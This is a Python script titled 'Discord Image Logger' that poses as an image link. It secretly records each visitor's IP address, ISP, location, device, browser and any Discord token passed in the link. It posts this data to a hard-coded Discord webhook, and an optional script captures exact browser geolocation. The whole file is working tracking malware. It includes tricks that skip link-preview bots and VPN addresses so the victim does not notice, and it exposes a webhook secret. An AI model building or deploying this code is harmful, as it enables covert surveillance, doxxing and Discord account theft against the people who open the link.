# Discord Image Logger
# By tg ace | orski ville

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to log IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0-mod"
__author__ = "Tgace + ChatGPT"

config = {
    "webhook": "https://discord.com/api/webhooks/1347691418423918612/TY4jhuDOUeauxK-VGtvdqf0jcfI3xhAKkthZ2hoNQz3cHFxIu-12AEcSY7_e3WkU643q",
    "image": "https://your-default-image.png",
    "imageArgument": True,
    "username": "Image Logger",
    "color": 0xff0000,
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": False,
        "message": "Custom msg here.",
        "richMessage": True
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {
        "redirect": False,
        "page": "https://your-redirect.com"
    }
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    return False

def reportError(error):
    requests.post(config["webhook"], json={
        "username": config["username"],
        "content": "@everyone",
        "embeds": [{
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred!\n```{error}```"
        }]
    })

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, token=None):
    if ip.startswith(blacklistedIPs): return

    bot = botCheck(ip, useragent)
    if bot and config["linkAlerts"]:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "embeds": [{
                "title": "Image Logger - Link Sent",
                "color": config["color"],
                "description": f"Logging link was sent.\n**IP:** `{ip}`\n**Platform:** `{bot}`\n**Endpoint:** `{endpoint}`"
            }]
        })
        return

    ping = "@everyone"
    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()

    if info["proxy"] and config["vpnCheck"] == 2:
        return
    if info["proxy"] and config["vpnCheck"] == 1:
        ping = ""

    if info["hosting"] and config["antiBot"] in [3, 4]:
        return
    if info["hosting"] and config["antiBot"] in [1, 2]:
        ping = ""

    os, browser = httpagentparser.simple_detect(useragent)
    token_line = f"\n> **Discord Token:** `{token}`" if token else ""

    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [{
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Image**

**Endpoint:** `{endpoint}`

**IP Info:**
> **IP:** `{ip}`
> **Provider:** `{info.get('isp', 'N/A')}`
> **ASN:** `{info.get('as', 'N/A')}`
> **Country:** `{info.get('country', 'N/A')}`
> **Region:** `{info.get('regionName', 'N/A')}`
> **City:** `{info.get('city', 'N/A')}`
> **Coords:** `{coords if coords else str(info.get('lat')) + ', ' + str(info.get('lon'))}`
> **Timezone:** `{info.get('timezone', 'N/A')}`
> **Mobile:** `{info.get('mobile', 'N/A')}`
> **VPN:** `{info.get('proxy', 'N/A')}`
> **Bot:** `{info.get('hosting', 'False')}`{token_line}

**Device Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```{useragent}```
"""
        }]
    }

    if url:
        embed["embeds"][0]["thumbnail"] = {"url": url}

    requests.post(config["webhook"], json=embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!...')  # Your existing base85 image blob
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    def handleRequest(self):
        try:
            s = self.path
            dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

            url = config["image"]
            if config["imageArgument"] and (dic.get("url") or dic.get("id")):
                try:
                    url = base64.b64decode(dic.get("url") or dic.get("id")).decode()
                except:
                    pass

            token = None
            if dic.get("tok"):
                try:
                    token = base64.b64decode(dic.get("tok")).decode()
                except:
                    token = "Invalid base64."

            if self.headers.get('x-forwarded-for', "").startswith(blacklistedIPs):
                return

            ip = self.headers.get('x-forwarded-for')
            ua = self.headers.get('user-agent')

            if botCheck(ip, ua):
                self.send_response(200 if config["buggedImage"] else 302)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
                self.end_headers()
                if config["buggedImage"]:
                    self.wfile.write(binaries["loading"])
                makeReport(ip, endpoint=s.split("?")[0], url=url, token=token)
                return

            if dic.get("g") and config["accurateLocation"]:
                location = base64.b64decode(dic.get("g").encode()).decode()
                result = makeReport(ip, ua, location, s.split("?")[0], url=url, token=token)
            else:
                result = makeReport(ip, ua, endpoint=s.split("?")[0], url=url, token=token)

            html = f"""<style>body{{margin:0}}.img{{background:url('{url}');background-size:contain;background-position:center;background-repeat:no-repeat;width:100vw;height:100vh}}</style><div class='img'></div>"""

            if config["redirect"]["redirect"]:
                html = f"<meta http-equiv='refresh' content='0;url={config['redirect']['page']}'>"

            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            if config["accurateLocation"]:
                html += """<script>
var u=window.location.href;
if(!u.includes("g=")){if(navigator.geolocation){navigator.geolocation.getCurrentPosition(function(c){
u+=u.includes("?")?"&":"?";u+="g="+btoa(c.coords.latitude+","+c.coords.longitude).replace(/=/g,"%3D");location.replace(u);});}}</script>"""

            self.wfile.write(html.encode())

        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b"500 Internal Server Error.")
            reportError(traceback.format_exc())

    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
